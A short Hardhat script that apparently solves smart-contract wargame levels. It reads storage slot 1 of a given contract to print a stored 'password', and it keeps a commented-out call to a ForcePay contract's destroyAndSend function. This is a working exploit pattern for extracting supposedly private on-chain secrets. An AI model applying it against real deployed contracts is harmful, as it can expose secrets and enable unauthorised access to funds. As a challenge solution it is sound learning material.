import hre, { ethers } from "hardhat";
import {ForcePay__factory} from "../typechain-types/factories/ForcePay__factory"    

async function main() {
    const signer = await ethers.provider.getSigner();
    // Contract setup
    const contractAddress = "0x0dc29A1Ff71Ef34Af37De7c768b63F07c1aDA878"; // Replace with your contract address
    
    const password = await ethers.provider.getStorage(contractAddress, 1n)
    console.log(ethers.toUtf8String(password))
    console.log(`Password: `, password)
    // const contract = new ethers.Contract(contractAddress, ForcePay__factory.abi, signer);
    // const result = await contract.destroyAndSend();
    // const receipt = await result.wait();
    // console.log(receipt)
  }


  main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
